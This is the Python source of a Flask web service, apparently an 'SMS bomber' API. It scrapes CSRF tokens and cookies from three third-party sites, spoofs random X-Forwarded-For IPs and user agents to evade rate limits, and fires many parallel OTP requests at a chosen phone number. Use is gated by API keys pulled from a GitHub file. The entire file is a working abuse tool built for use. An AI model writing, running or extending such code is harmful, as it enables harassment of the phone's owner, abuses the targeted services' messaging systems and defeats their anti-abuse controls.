from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup
import re
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'
LOGS_FILE = 'requests/logs.json'
KEYS_GITHUB_URL = 'https://raw.githubusercontent.com/gauravbeniwal3003-prog/sms-bomber-api/main/requests/keys.txt'

# ===== LOAD DATA =====
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    try:
        os.makedirs(os.path.dirname(file), exist_ok=True)
        with open(file, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

requests_data = load_json(REQUESTS_FILE, [])
stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
logs_data = load_json(LOGS_FILE, [])
active_keys = set()
service_stats = {}
bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}

# ===== LOAD KEYS =====
def load_keys_from_github():
    global active_keys
    try:
        resp = req_lib.get(KEYS_GITHUB_URL, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().split('\n')
            active_keys = {line.strip() for line in lines if line.strip() and not line.startswith('#')}
            return True
    except:
        pass
    return False

def validate_key(key):
    if not active_keys:
        load_keys_from_github()
    return key in active_keys

# ===== SESSION FUNCTIONS =====
def get_pansho_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36']),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache'
    }
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=8)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token = None
        meta = soup.find('meta', {'name': 'csrf-token'})
        if meta:
            token = meta.get('content')
        if not token:
            token_input = soup.find('input', {'name': '_token'})
            if token_input:
                token = token_input.get('value')
        if not token:
            token = 'DUMMY_TOKEN'
        cookies = session.cookies.get_dict()
        return session, cookies, token
    except:
        return None, None, None

def get_apitxt_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36']),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://apitxt.com/', headers=headers, timeout=8)
        return session, session.cookies.get_dict()
    except:
        return None, None

def get_testbook_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36']),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://testbook.com/', headers=headers, timeout=8)
        return session, session.cookies.get_dict()
    except:
        return None, None

# ===== SEND REQUEST =====
def send_request(req, phone):
    name = req['name']
    try:
        if 'pansho' in name.lower():
            session, cookies, token = get_pansho_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Referer'] = 'https://pansho.com/'
            body = req['body'].replace('{phone}', phone).replace('{token}', token)
            session.cookies.update(cookies)
            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=8)

        elif 'apitxt' in name.lower():
            session, cookies = get_apitxt_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Referer'] = 'https://apitxt.com/'
            body = json.loads(json.dumps(req['body']))
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            body['mobile_no'] = clean_phone
            body['country_code'] = random.choice(['91', '+91', '091'])
            session.cookies.update(cookies)
            r = session.post(req['url'], headers=headers, json=body, timeout=8)

        elif 'testbook' in name.lower():
            session, cookies = get_testbook_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Referer'] = 'https://testbook.com/'
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            url = req['url'].replace('{phone}', clean_phone)
            r = session.post(url, headers=headers, json=req['body'], timeout=8)

        else:
            return False

        if r.status_code in [200, 302, 201, 202]:
            update_stats(name, True)
            return True
        else:
            update_stats(name, False)
            return False

    except:
        update_stats(name, False)
        return False

def update_stats(name, success):
    with stats_lock:
        stats_data['total_requests'] += 1
        if success:
            stats_data['success'] += 1
        else:
            stats_data['failed'] += 1
        save_json(STATS_FILE, stats_data)
        
        if name not in service_stats:
            service_stats[name] = {"success": 0, "failed": 0, "total": 0}
        service_stats[name]["total"] += 1
        if success:
            service_stats[name]["success"] += 1
        else:
            service_stats[name]["failed"] += 1
        
        bombing_status['total_hits'] += 1
        if success:
            bombing_status['success_hits'] += 1
        else:
            bombing_status['failed_hits'] += 1

def parallel_bombing(phone, key, otp_count=10):
    global bombing_status, service_stats, stats_data
    
    service_stats = {}
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_json(STATS_FILE, stats_data)
    
    bombing_status = {
        "active": True,
        "phone": phone,
        "start_time": datetime.now().isoformat(),
        "total_hits": 0,
        "success_hits": 0,
        "failed_hits": 0,
        "completed": False
    }
    
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    with ThreadPoolExecutor(max_workers=len(active_requests) * otp_count * 2) as executor:
        futures = []
        for req in active_requests:
            phone_variants = req.get('phones', [phone])
            for i in range(otp_count):
                target_phone = random.choice(phone_variants) if phone_variants else phone
                future = executor.submit(send_request, req, target_phone)
                futures.append(future)
        
        for future in as_completed(futures):
            try:
                future.result(timeout=10)
            except:
                pass
    
    bombing_status['active'] = False
    bombing_status['completed'] = True

stats_lock = threading.Lock()

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "owner": "Gaurav Beniwal", "telegram": "@gaurav_beniwal_0001"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data,
        "active_keys": len(active_keys),
        "per_service": service_stats,
        "bombing_status": bombing_status
    })

@app.route('/api/keys', methods=['GET'])
def get_keys():
    return jsonify({"keys": list(active_keys), "count": len(active_keys)})

@app.route('/api/keys/refresh', methods=['POST'])
def refresh_keys():
    if load_keys_from_github():
        return jsonify({"success": True, "keys": list(active_keys), "count": len(active_keys)})
    return jsonify({"error": "Failed"}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(logs_data[-limit:])

@app.route('/api/bomb/status', methods=['GET'])
def bomb_status():
    return jsonify(bombing_status)

@app.route('/api/bomb/reset', methods=['POST'])
def reset_bombing():
    global bombing_status
    bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}
    return jsonify({"success": True, "message": "Bombing status reset"})

@app.route('/api', methods=['GET'])
def parallel_api():
    key = request.args.get('key')
    phone = request.args.get('bomb')
    otp_count = request.args.get('otp', 10, type=int)
    
    if not key:
        return jsonify({"error": "Missing 'key' parameter"}), 400
    if not validate_key(key):
        return jsonify({"error": "Invalid API key"}), 401
    if not phone:
        return jsonify({"error": "Missing 'bomb' parameter"}), 400
    if otp_count < 1 or otp_count > 50:
        return jsonify({"error": "OTP count must be between 1 and 50"}), 400
    
    if bombing_status.get('active', False):
        return jsonify({"success": False, "message": "⚠️ Bombing already in progress!", "status": bombing_status}), 409
    
    thread = threading.Thread(target=parallel_bombing, args=(phone, key, otp_count))
    thread.daemon = True
    thread.start()
    
    active_services = sum(1 for r in requests_data if r.get('active', True))
    total_requests = active_services * otp_count
    
    return jsonify({
        "success": True,
        "message": f"🔥 Bombing started! {otp_count}x per service = {total_requests} simultaneous requests!",
        "phone": phone,
        "otp_per_service": otp_count,
        "active_services": active_services,
        "total_simultaneous_requests": total_requests,
        "status_endpoint": "/api/bomb/status",
        "stats_endpoint": "/api/stats",
        "reset_endpoint": "/api/bomb/reset",
        "owner": "Gaurav Beniwal",
        "telegram": "@gaurav_beniwal_0001",
        "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
    })

# ===== /free — LOCAL DEVICE SCRIPT =====
@app.route('/free')
def free_page():
    return send_from_directory('../free', 'index.html')

@app.route('/free/script.js')
def free_script():
    return send_from_directory('../free', 'script.js')

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

load_keys_from_github()
app.debug = False

if __name__ == '__main__':
    app.run(debug=True, port=5000)
